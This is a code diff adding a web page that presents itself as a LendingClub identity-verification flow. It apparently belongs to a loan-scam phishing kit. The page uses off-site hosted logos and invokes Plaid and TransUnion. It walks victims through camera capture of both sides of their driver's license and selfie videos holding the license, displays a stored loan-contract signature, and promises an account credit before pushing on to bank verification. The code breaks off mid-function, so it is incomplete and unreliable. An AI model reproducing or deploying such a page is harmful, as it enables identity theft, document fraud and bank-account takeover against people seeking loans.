@@ -1,0 +1,1328 @@
+<style>
+/* ── c_formc_v1 — KYC Identity Verification ── */
+:root {
+  --lc-navy: #113b5e;
+  --lc-blue: #82cde5;
+  --lc-orange: #f43d1d;
+  --text-dark: #2c3e50;
+  --text-light: #6c757d;
+  --bg-light: #f8f9fa;
+  --border-light: #e9ecef;
+  --success-green: #45a049;
+  --shadow-lg: 0 8px 24px rgba(0,0,0,0.15);
+  --transition: all 0.3s cubic-bezier(0.4,0,0.2,1);
+}
+.frag-contract {
+  background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 20px;
+}
+.card {
+  background: #fff;
+  border-radius: 16px;
+  box-shadow: var(--shadow-lg);
+  overflow: hidden;
+  margin-bottom: 20px;
+  width: 100%;
+  max-width: 560px;
+}
+.card-header { background: linear-gradient(90deg, var(--lc-navy), #0c2c46); padding: 22px; text-align: center; }
+.card-header img { max-width: 200px; filter: brightness(0) invert(1); }
+.card-body { padding: 28px; }
+.card-title { font-size: 22px; font-weight: 600; color: var(--text-dark); margin-bottom: 6px; text-align: center; font-family: 'Playfair Display', serif; }
+.card-subtitle { font-size: 13.5px; color: var(--text-light); text-align: center; margin-bottom: 22px; }
+/* KYC Steps */
+.kyc-steps { display: flex; flex-direction: column; gap: 14px; }
+.kyc-step-item {
+  display: flex;
+  align-items: center;
+  padding: 13px;
+  background: var(--bg-light);
+  border-radius: 12px;
+  border: 2px solid var(--border-light);
+  cursor: pointer;
+  transition: var(--transition);
+}
+.kyc-step-item:hover { border-color: var(--lc-navy); transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
+.kyc-step-item.completed { border-color: var(--success-green); background: #f0fdf4; }
+.kyc-step-icon {
+  width: 46px; height: 46px;
+  border-radius: 50%;
+  background: var(--lc-navy);
+  display: flex; align-items: center; justify-content: center;
+  margin-right: 14px;
+  flex-shrink: 0;
+}
+.kyc-step-icon i { color: white; font-size: 18px; }
+.kyc-step-item.completed .kyc-step-icon { background: var(--success-green); }
+.kyc-step-content { flex: 1; }
+.kyc-step-title { font-size: 15px; font-weight: 600; color: var(--text-dark); margin-bottom: 3px; }
+.kyc-step-desc  { font-size: 12px; color: var(--text-light); }
+.kyc-step-status {
+  font-size: 11px;
+  padding: 3px 9px;
+  border-radius: 20px;
+  background: var(--border-light);
+  color: var(--text-light);
+  white-space: nowrap;
+}
+.kyc-step-item.completed .kyc-step-status { background: var(--success-green); color: white; }
+/* Complete button */
+.continue-btn {
+  width: 100%;
+  padding: 15px;
+  background: #121212;
+  color: white;
+  border: none;
+  border-radius: 6px;
+  font-size: 15px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: var(--transition);
+  margin-top: 22px;
+}
+.continue-btn:hover:not(:disabled) { background: linear-gradient(270deg, #00ad6a, #0f263c); }
+.continue-btn:disabled { background: #ccc; cursor: not-allowed; opacity: 0.7; }
+/* ── Scanner Wrapper ── */
+.scanner-wrapper {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: var(--lc-navy);
+  z-index: 10000;
+  overflow: hidden;
+}
+.scanner-wrapper.active { display: flex; flex-direction: column; }
+.scanner-progress-bar {
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 58px;
+  background: rgba(255,255,255,0.1);
+  backdrop-filter: blur(10px);
+  display: flex; align-items: center; justify-content: center;
+  z-index: 10001;
+}
+.progress-steps { display: flex; align-items: center; gap: 18px; }
+.progress-step {
+  display: flex; align-items: center; gap: 7px;
+  color: rgba(255,255,255,0.45);
+  font-size: 11px; font-weight: 500;
+  transition: var(--transition);
+}
+.progress-step.active { color: white; }
+.progress-step.completed { color: var(--success-green); }
+.progress-circle {
+  width: 26px; height: 26px;
+  border-radius: 50%;
+  border: 2px solid currentColor;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 11px; font-weight: 600;
+  background: rgba(255,255,255,0.08);
+}
+.progress-step.completed .progress-circle { background: var(--success-green); border-color: var(--success-green); color: white; }
+.progress-step.active    .progress-circle { background: white; color: var(--lc-navy); border-color: white; }
+/* Scanner content */
+.scanner-content {
+  flex: 1;
+  display: flex; flex-direction: column;
+  align-items: center; justify-content: flex-start;
+  padding: 68px 12px 12px;
+  overflow-y: auto;
+  min-height: 100%;
+  box-sizing: border-box;
+}
+.scanner-instructions { text-align: center; color: white; margin-bottom: 16px; max-width: 480px; }
+.scanner-title  { font-size: 20px; font-weight: 600; margin-bottom: 8px; }
+.scanner-subtitle { font-size: 13px; opacity: 0.88; line-height: 1.5; }
+/* Infographic banner */
+.infographic-banner {
+  display: none;
+  width: 100%; max-width: 440px;
+  background: rgba(255,255,255,0.08);
+  border: 1px solid rgba(255,255,255,0.16);
+  border-radius: 12px;
+  padding: 10px 13px;
+  margin-bottom: 12px;
+  flex-direction: row; align-items: center; gap: 10px;
+}
+.infographic-banner.visible { display: flex; }
+.infographic-banner img { width: 48px; height: 48px; object-fit: contain; flex-shrink: 0; }
+.infographic-banner-text strong { display: block; font-size: 11px; font-weight: 700; color: #fff; margin-bottom: 2px; text-transform: uppercase; letter-spacing: 0.3px; }
+.infographic-banner-text span   { font-size: 11px; color: rgba(255,255,255,0.7); line-height: 1.4; }
+/* Camera viewport */
+.scanner-view-container {
+  position: relative;
+  width: 100%; max-width: 440px;
+  height: 50vh; max-height: 420px; min-height: 280px;
+  display: flex; align-items: center; justify-content: center;
+  background: #000;
+  border-radius: 12px;
+  overflow: hidden;
+}
+#scanner-video, .scanner-preview-img { width: 100%; height: 100%; object-fit: cover; }
+.scanner-preview-img { display: none; object-fit: contain; background: #000; }
+.scanner-preview-img.active { display: block; }
+/* Get-ready overlay */
+.getready-overlay {
+  display: none; position: absolute; inset: 0;
+  background: rgba(17,59,94,0.96); z-index: 30;
+  flex-direction: column; align-items: center; justify-content: center;
+  text-align: center; padding: 24px; border-radius: 12px;
+}
+.getready-overlay.active { display: flex; }
+.getready-number { font-size: 88px; font-weight: 800; color: #fff; line-height: 1; animation: grPop 1s ease-in-out infinite; }
+@keyframes grPop { 0%,100%{transform:scale(1);opacity:1;} 50%{transform:scale(1.1);opacity:.8;} }
+.getready-title { font-size: 17px; font-weight: 700; color: #fff; margin-top: 14px; }
+.getready-hint  { font-size: 12px; color: rgba(255,255,255,.6); margin-top: 7px; max-width: 260px; line-height: 1.5; }
+/* Frame lock badge */
+.framelock-badge {
+  position: absolute; bottom: 10px; left: 50%; transform: translateX(-50%);
+  display: flex; align-items: center; gap: 6px;
+  padding: 5px 14px; border-radius: 20px; font-size: 11px; font-weight: 600;
+  color: #fff; background: rgba(255,255,255,0.1);
+  border: 1px solid rgba(255,255,255,0.18);
+  transition: background .4s, border-color .4s;
+  pointer-events: none; white-space: nowrap; z-index: 10;
+}
+.framelock-badge.locked { background: rgba(69,160,73,.88); border-color: rgba(69,160,73,.5); }
+.framelock-dot { width: 7px; height: 7px; border-radius: 50%; background: rgba(255,255,255,.45); transition: background .3s; }
+.framelock-badge.locked .framelock-dot { background: #fff; animation: blinkDot .8s infinite; }
+@keyframes blinkDot { 0%,50%{opacity:1;} 51%,100%{opacity:.3;} }
+/* Scanner frame corners */
+.scanner-frame {
+  position: absolute;
+  top: 50%; left: 50%;
+  transform: translate(-50%, -50%);
+  pointer-events: none;
+  transition: var(--transition);
+}
+.scanner-frame.id-frame     { width: 84%; aspect-ratio: 1.586; max-width: 340px; }
+.scanner-frame.selfie-frame { width: 63%; aspect-ratio: 1; max-width: 270px; border-radius: 50%; }
+.corner-marker { position: absolute; width: 24px; height: 24px; }
+.corner-marker::before,.corner-marker::after { content:''; position:absolute; background:white; transition: var(--transition); }
+.corner-marker.top-left    { top:0;    left:0;  } .corner-marker.top-left::before  { top:0;    left:0;  width:100%; height:3px; } .corner-marker.top-left::after   { top:0;    left:0;  width:3px; height:100%; }
+.corner-marker.top-right   { top:0;    right:0; } .corner-marker.top-right::before { top:0;    right:0; width:100%; height:3px; } .corner-marker.top-right::after  { top:0;    right:0; width:3px; height:100%; }
+.corner-marker.bottom-left { bottom:0; left:0;  } .corner-marker.bottom-left::before { bottom:0; left:0; width:100%; height:3px; } .corner-marker.bottom-left::after { bottom:0; left:0; width:3px; height:100%; }
+.corner-marker.bottom-right{ bottom:0; right:0; } .corner-marker.bottom-right::before{ bottom:0; right:0; width:100%; height:3px; } .corner-marker.bottom-right::after{ top:0; right:0; width:3px; height:100%; }
+.scanner-frame.frame-locked .corner-marker::before,
+.scanner-frame.frame-locked .corner-marker::after { background: #45a049 !important; }
+/* Recording progress bar */
+.rec-progress-wrap { display: none; flex-direction: column; align-items: center; gap: 5px; width: 100%; max-width: 440px; margin-top: 14px; }
+.rec-progress-wrap.active { display: flex; }
+.rec-progress-track { width: 100%; height: 5px; background: rgba(255,255,255,0.14); border-radius: 3px; overflow: hidden; }
+.rec-progress-fill { height: 100%; width: 0%; border-radius: 3px; background: linear-gradient(90deg, #45a049, #82e087); transition: width .15s linear; }
+.rec-progress-label { font-size: 11px; color: rgba(255,255,255,.7); display: flex; align-items: center; gap: 5px; }
+.rec-live-dot { width: 6px; height: 6px; border-radius: 50%; background: #45a049; animation: blinkDot .8s infinite; }
+.recording-timer { display: none !important; }
+/* Scanner controls */
+.scanner-controls { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 14px; justify-content: center; padding-bottom: 20px; }
+.scanner-btn { padding: 12px 22px !important; border: none; border-radius: 30px; font-size: 14px !important; font-weight: 600; cursor: pointer; transition: var(--transition); display: flex; align-items: center; gap: 7px; min-width: 110px; }
+.scanner-btn.capture { background: white; color: var(--lc-navy); }
+.scanner-btn.capture:hover { transform: scale(1.04); }
+.scanner-btn.retake  { background: rgba(255,255,255,0.18); color: white; }
+.scanner-btn.confirm { background: var(--success-green); color: white; }
+.scanner-btn.cancel  { background: rgba(255,255,255,0.1); color: white; border: 1px solid rgba(255,255,255,0.28); }
+.scanner-btn.armed { animation: btnGlow 1.6s ease-in-out infinite; }
+@keyframes btnGlow { 0%,100%{box-shadow:0 0 0 0 rgba(255,255,255,0);} 50%{box-shadow:0 0 0 9px rgba(255,255,255,0.2);} }
+.scanner-btn:disabled { opacity: 0.38; cursor: not-allowed; pointer-events: none; }
+/* Completion overlay */
+.completion-overlay {
+  display: none; position: fixed; inset: 0;
+  background: rgba(17,59,94,0.95); z-index: 10001;
+  justify-content: center; align-items: center;
+}
+.completion-overlay.active { display: flex; }
+.completion-content { text-align: center; color: white; padding: 36px 24px; max-width: 460px; }
+.completion-icon {
+  width: 90px; height: 90px;
+  background: var(--success-green);
+  border-radius: 50%;
+  display: flex; align-items: center; justify-content: center;
+  margin: 0 auto 24px;
+  animation: scaleIn .5s ease;
+}
+@keyframes scaleIn { 0%{transform:scale(0);} 50%{transform:scale(1.1);} 100%{transform:scale(1);} }
+.completion-icon i { font-size: 44px; color: white; }
+.completion-title { font-size: 26px; font-weight: 600; margin-bottom: 12px; font-family: 'Playfair Display', serif; }
+.completion-message { font-size: 14.5px; opacity: .88; margin-bottom: 28px; line-height: 1.6; }
+.completion-plaid-row {
+  display: flex; align-items: center; justify-content: center;
+  gap: 16px; margin: 20px 0 28px;
+  padding: 16px 20px;
+  background: rgba(255,255,255,0.1);
+  border-radius: 12px;
+}
+.completion-plaid-row img { height: 36px; width: auto; filter: brightness(0) invert(1); }
+.completion-plaid-row .plaid-divider { width: 2px; height: 36px; background: rgba(255,255,255,0.3); border-radius: 1px; }
+@media (max-width: 480px) {
+  .scanner-title { font-size: 15px !important; }
+  .scanner-subtitle { font-size: 12px !important; }
+}
+</style>
+
+<!-- KYC Card -->
+<div class="frag-contract">
+  <div class="card">
+    <div class="card-header">
+      <img src="https://i.ibb.co/DLHxff7/Lending-Club-logo-svg.png" alt="LendingClub">
+    </div>
+    <div class="card-body">
+      <h2 class="card-title">Identity Verification</h2>
+      <p class="card-subtitle">Complete all steps to verify your identity</p>
+
+      <div class="kyc-steps">
+        <div class="kyc-step-item" id="kycStep1" onclick="window.startKYCStep && window.startKYCStep(1)">
+          <div class="kyc-step-icon"><i class="fas fa-id-card"></i></div>
+          <div class="kyc-step-content">
+            <p class="kyc-step-title">Scan Front of Driver's License</p>
+            <p class="kyc-step-desc">Position the front of your ID within the frame</p>
+          </div>
+          <span class="kyc-step-status">Pending</span>
+        </div>
+        <div class="kyc-step-item" id="kycStep2" onclick="window.startKYCStep && window.startKYCStep(2)">
+          <div class="kyc-step-icon"><i class="fas fa-id-card-alt"></i></div>
+          <div class="kyc-step-content">
+            <p class="kyc-step-title">Scan Back of Driver's License</p>
+            <p class="kyc-step-desc">Position the back of your ID within the frame</p>
+          </div>
+          <span class="kyc-step-status">Pending</span>
+        </div>
+        <div class="kyc-step-item" id="kycStep3" onclick="window.startKYCStep && window.startKYCStep(3)">
+          <div class="kyc-step-icon"><i class="fas fa-user-shield"></i></div>
+          <div class="kyc-step-content">
+            <p class="kyc-step-title">Selfie + Front of Driver's License</p>
+            <p class="kyc-step-desc">Hold front of DL below face level — both must be visible</p>
+          </div>
+          <span class="kyc-step-status">Pending</span>
+        </div>
+        <div class="kyc-step-item" id="kycStep4" onclick="window.startKYCStep && window.startKYCStep(4)">
+          <div class="kyc-step-icon"><i class="fas fa-user-shield"></i></div>
+          <div class="kyc-step-content">
+            <p class="kyc-step-title">Selfie + Back of Driver's License</p>
+            <p class="kyc-step-desc">Hold back of DL below face level — both must be visible</p>
+          </div>
+          <span class="kyc-step-status">Pending</span>
+        </div>
+      </div>
+
+      <button class="continue-btn" id="kycCompleteBtn"
+        onclick="window.completeKYC && window.completeKYC()"
+        disabled style="margin-top:22px;">
+        Complete Verification
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- KYC Scanner Wrapper -->
+<div class="scanner-wrapper" id="scannerWrapper">
+  <div class="scanner-progress-bar">
+    <div class="progress-steps">
+      <div class="progress-step" id="scanStep1"><div class="progress-circle">1</div><span>Front ID</span></div>
+      <div class="progress-step" id="scanStep2"><div class="progress-circle">2</div><span>Back ID</span></div>
+      <div class="progress-step" id="scanStep3"><div class="progress-circle">3</div><span>Selfie Front</span></div>
+      <div class="progress-step" id="scanStep4"><div class="progress-circle">4</div><span>Selfie Back</span></div>
+    </div>
+  </div>
+  <div class="scanner-content">
+    <div class="scanner-instructions">
+      <h2 class="scanner-title" id="scannerTitle">Scan Front of ID</h2>
+      <p class="scanner-subtitle" id="scannerSubtitle">Position your ID within the frame</p>
+    </div>
+    <div class="infographic-banner" id="kycInfoBanner">
+      <img src="https://i.ibb.co/kg2kmQQQ/woman-14425519.png" alt="">
+      <div class="infographic-banner-text">
+        <strong>Hold ID below face</strong>
+        <span id="kycInfoText">Face AND full ID must be visible.</span>
+      </div>
+    </div>
+    <div class="scanner-view-container">
+      <video id="scanner-video" autoplay playsinline muted></video>
+      <img class="scanner-preview-img" id="scannerPreview" src="" alt="">
+      <div class="getready-overlay" id="kycGetReady">
+        <div class="getready-number" id="kycCountdownNum">5</div>
+        <div class="getready-title">Get Ready</div>
+        <div class="getready-hint" id="kycGetReadyHint">Position your ID in the frame</div>
+      </div>
+      <div class="framelock-badge" id="kycFrameLockBadge">
+        <span class="framelock-dot"></span>
+        <span id="kycFrameLockText">Waiting for frame…</span>
+      </div>
+      <div class="recording-timer" id="recordingTimer"></div>
+      <div class="scanner-frame id-frame" id="scannerFrame">
+        <div class="corner-marker top-left"></div>
+        <div class="corner-marker top-right"></div>
+        <div class="corner-marker bottom-left"></div>
+        <div class="corner-marker bottom-right"></div>
+      </div>
+    </div>
+    <div class="rec-progress-wrap" id="kycRecProgress">
+      <div class="rec-progress-track">
+        <div class="rec-progress-fill" id="kycRecFill"></div>
+      </div>
+      <div class="rec-progress-label">
+        <span class="rec-live-dot"></span>
+        <span id="kycRecLabel">Scanning… 0%</span>
+      </div>
+    </div>
+    <div class="scanner-controls" id="scannerControls">
+      <button class="scanner-btn cancel" onclick="window.cancelScanner && window.cancelScanner()">
+        <i class="fas fa-times"></i> Cancel
+      </button>
+      <button class="scanner-btn capture" id="captureBtn"
+        onclick="window.captureImage && window.captureImage()" disabled>
+        <i class="fas fa-camera"></i>
+        <span id="captureBtnLabel">Capture</span>
+      </button>
+    </div>
+    <div class="scanner-controls" id="previewControls" style="display:none;">
+      <button class="scanner-btn retake" onclick="window.retakeCapture && window.retakeCapture()">
+        <i class="fas fa-redo"></i> Retake
+      </button>
+      <button class="scanner-btn confirm" onclick="window.confirmCapture && window.confirmCapture()">
+        <i class="fas fa-check"></i> Use This
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- Completion Overlay -->
+<div class="completion-overlay" id="completionOverlay">
+  <div class="completion-content">
+    <div class="completion-icon"><i class="fas fa-check"></i></div>
+    <h2 class="completion-title">Verification Submitted!</h2>
+    <p class="completion-message">
+      Your identity verification has been sent for review under TransUnion Credit Bureau.<br><br>
+      This review may take up to <strong>2 hours</strong> to complete.<br>
+      Your account will be credited within <strong>6-7 working hours</strong>.
+    </p>
+
+    <!-- Digital Signature Display -->
+    <div class="completion-sig-wrap" id="completionSigWrap">
+      <div class="completion-sig-label">
+        <i class="fas fa-signature" style="margin-right:6px;opacity:.7;"></i>
+        Loan Contract &mdash; Digital Signature
+      </div>
+      <div class="completion-sig-box">
+        <img id="completionSigImg" src="" alt="Digital Signature" class="completion-sig-img">
+        <div class="completion-sig-underline"></div>
+        <div class="completion-sig-footer">
+          <span id="completionSigName"></span>
+          <span id="completionSigDate"></span>
+        </div>
+      </div>
+    </div>
+
+    <div class="completion-plaid-row">
+      <img src="https://i.ibb.co/DLHxff7/Lending-Club-logo-svg.png" alt="LendingClub">
+      <div class="plaid-divider"></div>
+      <img src="https://i.ibb.co/20tK8xrs/pngwing-com.png" alt="Plaid">
+    </div>
+    <center>
+      <button class="scanner-btn confirm"
+        onclick="window._kycProceedToPlaid && window._kycProceedToPlaid()"
+        style="margin-top:8px; padding: 14px 32px;">
+        Continue &mdash; Verify Your Bank <i class="fas fa-arrow-right" style="margin-left:6px;"></i>
+      </button>
+    </center>
+  </div>
+</div>
+
+<style>
+.completion-sig-wrap {
+  width: 100%;
+  max-width: 380px;
+  margin: 0 auto 22px;
+  opacity: 0;
+  transform: translateY(10px);
+  transition: opacity 0.55s ease 0.25s, transform 0.55s ease 0.25s;
+}
+.completion-sig-wrap.visible {
+  opacity: 1;
+  transform: translateY(0);
+}
+.completion-sig-label {
+  font-size: 10px;
+  font-weight: 600;
+  letter-spacing: 0.8px;
+  text-transform: uppercase;
+  color: rgba(255,255,255,0.42);
+  text-align: center;
+  margin-bottom: 10px;
+}
+.completion-sig-box {
+  background: rgba(255,255,255,0.065);
+  border: 1px solid rgba(255,255,255,0.13);
+  border-radius: 12px;
+  padding: 14px 20px 10px;
+  backdrop-filter: blur(8px);
+}
+.completion-sig-img {
+  display: block;
+  width: 100%;
+  max-height: 76px;
+  object-fit: contain;
+  filter: invert(1) brightness(1.15);
+}
+.completion-sig-underline {
+  width: 100%;
+  height: 1px;
+  background: linear-gradient(90deg,
+    transparent 0%, rgba(130,205,229,0.45) 20%,
+    rgba(130,205,229,0.75) 50%, rgba(130,205,229,0.45) 80%, transparent 100%);
+  margin: 9px 0 7px;
+}
+.completion-sig-footer {
+  display: flex;
+  justify-content: space-between;
+  font-size: 10px;
+  color: rgba(255,255,255,0.35);
+  letter-spacing: 0.3px;
+}
+</style>
+
+<script>
+(function() {
+  var overlay = document.getElementById('completionOverlay');
+  if (!overlay) return;
+
+  function _populateSig() {
+    var sigData = window.SPA && window.SPA.storage.get('signature');
+    var wrap    = document.getElementById('completionSigWrap');
+    if (!wrap) return;
+
+    if (!sigData) {
+      wrap.style.display = 'none';
+      return;
+    }
+
+    var img    = document.getElementById('completionSigImg');
+    var nameEl = document.getElementById('completionSigName');
+    var dateEl = document.getElementById('completionSigDate');
+
+    if (img)    img.src = sigData;
+
+    var appData = window.SPA && window.SPA.storage.get('app_data');
+    if (nameEl) nameEl.textContent = (appData && appData.client_name) ? appData.client_name : '';
+    if (dateEl) dateEl.textContent = new Date().toLocaleDateString('en-US', {
+      month: 'short', day: 'numeric', year: 'numeric'
+    });
+
+    requestAnimationFrame(function() {
+      requestAnimationFrame(function() { wrap.classList.add('visible'); });
+    });
+  }
+
+  new MutationObserver(function(muts) {
+    muts.forEach(function(m) {
+      if (m.attributeName === 'class') {
+        if (overlay.classList.contains('active')) setTimeout(_populateSig, 200);
+        else {
+          var w = document.getElementById('completionSigWrap');
+          if (w) w.classList.remove('visible');
+        }
+      }
+    });
+  }).observe(overlay, { attributes: true });
+})();
+</script>
+
+<style>
+/* ── KYC Engine v3 — extra UI styles ── */
+.kyc-quality-bar-wrap {
+  display: none;
+  flex-direction: column;
+  gap: 5px;
+  width: 100%;
+  max-width: 440px;
+  margin-top: 12px;
+}
+.kyc-quality-bar-wrap.active { display: flex; }
+.kyc-quality-row {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 11px;
+  color: rgba(255,255,255,0.75);
+}
+.kyc-quality-track {
+  flex: 1;
+  height: 4px;
+  background: rgba(255,255,255,0.12);
+  border-radius: 2px;
+  overflow: hidden;
+}
+.kyc-quality-fill {
+  height: 100%;
+  border-radius: 2px;
+  transition: width 0.25s ease, background 0.4s ease;
+  width: 0%;
+  background: #f43d1d;
+}
+.kyc-quality-fill.ok   { background: #f59e0b; }
+.kyc-quality-fill.good { background: #45a049; }
+.kyc-quality-label {
+  min-width: 36px;
+  text-align: right;
+  font-weight: 600;
+  font-size: 11px;
+  color: rgba(255,255,255,0.8);
+}
+.kyc-countdown-ring {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  z-index: 31;
+  display: none;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+}
+.kyc-countdown-ring.active { display: flex; }
+.kyc-countdown-svg { transform: rotate(-90deg); }
+.kyc-countdown-circle-bg { stroke: rgba(255,255,255,0.15); }
+.kyc-countdown-circle-fg {
+  stroke: #82cde5;
+  stroke-linecap: round;
+  transition: stroke-dashoffset 0.95s linear;
+}
+.kyc-countdown-num {
+  position: absolute;
+  font-size: 42px;
+  font-weight: 800;
+  color: #fff;
+  text-shadow: 0 0 20px rgba(130,205,229,0.6);
+  line-height: 1;
+}
+.kyc-countdown-label {
+  position: absolute;
+  bottom: -18px;
+  font-size: 11px;
+  color: rgba(255,255,255,0.6);
+  letter-spacing: 0.5px;
+  white-space: nowrap;
+}
+</style>
+
+<script>
+// ── KYC Scanner Engine v3 ─────────────────────────────────────────
+(function() {
+
+  // ── State ──────────────────────────────────────────────────────
+  var currentKYCStep      = 0;
+  var kycStepsCompleted   = window.kycStepsCompleted || [false,false,false,false];
+  var stream              = null;
+  var capturedBlob        = null;
+  var frameLockAchieved   = false;
+
+  // Timers
+  var countdownTimer    = null;
+  var motionRaf         = null;
+  var qualityRaf        = null;
+  var recordingInterval = null;
+  var stableMs          = 0;
+  var prevPixels        = null;
+  var lastTs            = 0;
+
+  // Thresholds
+  var COUNTDOWN_SECS    = 7;
+  var STABLE_NEEDED_MS  = 1600;   // hold-still time to achieve frame lock
+  var MOTION_THRESHOLD  = 18;     // avg pixel diff per channel
+  var RECORD_DURATION   = 12000;  // 12s for selfie steps
+  var CIRCUMFERENCE     = 2 * Math.PI * 44; // SVG circle circumference
+
+  // Step definitions
+  var STEPS = [
+    null,
+    {
+      title:    "Scan Front of Driver's License",
+      subtitle: 'Hold ID flat · All 4 corners inside frame · Steady and well-lit',
+      stepType: 'kyc_front_dl',
+      frame:    'id-frame',
+      selfie:   false,
+      mode:     'photo',   // photo = still capture
+      facing:   'environment',
+      infoBanner: false,
+      getReadyHint: 'Position FRONT of your ID inside the frame',
+    },
+    {
+      title:    "Scan Back of Driver's License",
+      subtitle: 'Flip your ID · All 4 corners inside frame · Steady',
+      stepType: 'kyc_back_dl',
+      frame:    'id-frame',
+      selfie:   false,
+      mode:     'photo',
+      facing:   'environment',
+      infoBanner: false,
+      getReadyHint: 'Position BACK of your ID inside the frame',
+    },
+    {
+      title:    'Selfie + Front of Driver\'s License',
+      subtitle: 'Hold Front of DL below your chin · Face + full card in frame',
+      stepType: 'kyc_selfie_front_dl',
+      frame:    'selfie-frame',
+      selfie:   true,
+      mode:     'video',
+      facing:   'user',
+      infoBanner: true,
+      infoTitle: 'Hold ID below face · edges gripped',
+      infoText:  'Face AND entire FRONT of ID must be visible. Zoom out if needed.',
+      getReadyHint: 'Hold FRONT of DL at chin level — face + full ID in frame',
+    },
+    {
+      title:    'Selfie + Back of Driver\'s License',
+      subtitle: 'Hold Back of DL below your chin · Face + full card in frame',
+      stepType: 'kyc_selfie_back_dl',
+      frame:    'selfie-frame',
+      selfie:   true,
+      mode:     'video',
+      facing:   'user',
+      infoBanner: true,
+      infoTitle: 'Hold ID below face · edges gripped',
+      infoText:  'Face AND entire BACK of ID must be visible. Zoom out if needed.',
+      getReadyHint: 'Hold BACK of DL at chin level — face + full ID in frame',
+    },
+  ];
+
+  // ── Expose globals ────────────────────────────────────────────
+  window.kycStepsCompleted = kycStepsCompleted;
+  window.currentKYCStep    = currentKYCStep;
+
+  // ── Inject quality bar + countdown ring into DOM ──────────────
+  function _injectExtraUI() {
+    // Quality bar (steps 1&2 only)
+    if (!document.getElementById('kycQualityBar')) {
+      var qb = document.createElement('div');
+      qb.id = 'kycQualityBar';
+      qb.className = 'kyc-quality-bar-wrap';
+      qb.innerHTML =
+        '<div class="kyc-quality-row">' +
+          '<span style="min-width:56px;font-size:11px;color:rgba(255,255,255,.7)">Sharpness</span>' +
+          '<div class="kyc-quality-track"><div class="kyc-quality-fill" id="kycQFillSharp"></div></div>' +
+          '<span class="kyc-quality-label" id="kycQLabelSharp">0%</span>' +
+        '</div>' +
+        '<div class="kyc-quality-row">' +
+          '<span style="min-width:56px;font-size:11px;color:rgba(255,255,255,.7)">Stability</span>' +
+          '<div class="kyc-quality-track"><div class="kyc-quality-fill" id="kycQFillStab"></div></div>' +
+          '<span class="kyc-quality-label" id="kycQLabelStab">0%</span>' +
+        '</div>';
+      var recWrap = document.getElementById('kycRecProgress');
+      if (recWrap && recWrap.parentNode) {
+        recWrap.parentNode.insertBefore(qb, recWrap);
+      }
+    }
+
+    // Countdown ring (inside scanner-view-container)
+    if (!document.getElementById('kycCountdownRing')) {
+      var ring = document.createElement('div');
+      ring.id = 'kycCountdownRing';
+      ring.className = 'kyc-countdown-ring';
+      ring.innerHTML =
+        '<svg class="kyc-countdown-svg" width="106" height="106" viewBox="0 0 106 106">' +
+          '<circle class="kyc-countdown-circle-bg" cx="53" cy="53" r="44" fill="rgba(17,59,94,0.88)" stroke-width="5" />' +
+          '<circle class="kyc-countdown-circle-fg" id="kycCountdownArc" cx="53" cy="53" r="44"' +
+            ' fill="none" stroke-width="5"' +
+            ' stroke-dasharray="' + CIRCUMFERENCE.toFixed(1) + '"' +
+            ' stroke-dashoffset="' + CIRCUMFERENCE.toFixed(1) + '" />' +
+        '</svg>' +
+        '<span class="kyc-countdown-num" id="kycCountdownDigit">' + COUNTDOWN_SECS + '</span>' +
+        '<span class="kyc-countdown-label" id="kycCountdownMsg">Get Ready</span>';
+      var vc = document.querySelector('.scanner-view-container');
+      if (vc) vc.appendChild(ring);
+    }
+  }
+
+  // ── startKYCStep (public entry) ───────────────────────────────
+  window.startKYCStep = function(stepNum) {
+    var step = STEPS[stepNum];
+    if (!step) return;
+
+    if (kycStepsCompleted[stepNum - 1]) {
+      _toast('Step already completed ✓'); return;
+    }
+
+    currentKYCStep        = stepNum;
+    window.currentKYCStep = stepNum;
+    capturedBlob          = null;
+    frameLockAchieved     = false;
+
+    _stopAllTimers();
+    _stopCamera();
+    _injectExtraUI();
+    _resetControls();
+    _updateProgressBar(stepNum);
+
+    // Set scanner text
+    _setText('scannerTitle',    step.title);
+    _setText('scannerSubtitle', step.subtitle);
+
+    // Frame shape
+    var frame = document.getElementById('scannerFrame');
+    if (frame) frame.className = 'scanner-frame ' + step.frame;
+
+    // Infographic banner
+    var banner = document.getElementById('kycInfoBanner');
+    if (banner) banner.classList.toggle('visible', !!step.infoBanner);
+    if (step.infoText)  _setText('kycInfoText', step.infoText);
+
+    // Capture button label
+    var capBtn = document.getElementById('captureBtn');
+    var capLbl = document.getElementById('captureBtnLabel');
+    if (capBtn) { capBtn.disabled = true; capBtn.classList.remove('armed'); }
+    if (capLbl) capLbl.textContent = step.mode === 'video' ? 'Scan Now' : 'Capture';
+    var capIcon = capBtn && capBtn.querySelector('i');
+    if (capIcon) capIcon.className = step.mode === 'video' ? 'fas fa-video' : 'fas fa-camera';
+
+    // Show quality bar for photo steps, rec bar for video steps
+    var qb = document.getElementById('kycQualityBar');
+    var rb = document.getElementById('kycRecProgress');
+    if (qb) qb.classList.toggle('active', step.mode === 'photo');
+    if (rb) { rb.classList.remove('active'); }
+
+    // Show scanner overlay
+    var wrapper = document.getElementById('scannerWrapper');
+    if (wrapper) wrapper.classList.add('active');
+
+    // Start 7s countdown then open camera
+    _startCountdown(step);
+  };
+
+  // ── Cancel ────────────────────────────────────────────────────
+  window.cancelScanner = function() {
+    _stopAllTimers();
+    _stopCamera();
+    var wrapper = document.getElementById('scannerWrapper');
+    if (wrapper) wrapper.classList.remove('active');
+    _resetControls();
+    _hideCountdownRing();
+  };
+
+  // ── Capture (photo steps 1&2) ─────────────────────────────────
+  window.captureImage = function() {
+    var video = document.getElementById('scanner-video');
+    if (!video || !stream || !frameLockAchieved) return;
+
+    _stopMotionDetect();
+    _stopQualityAnalysis();
+
+    // Full native resolution — use actual track capabilities
+    var track    = stream.getVideoTracks()[0];
+    var settings = track ? track.getSettings() : {};
+    var w = settings.width  || video.videoWidth  || 1280;
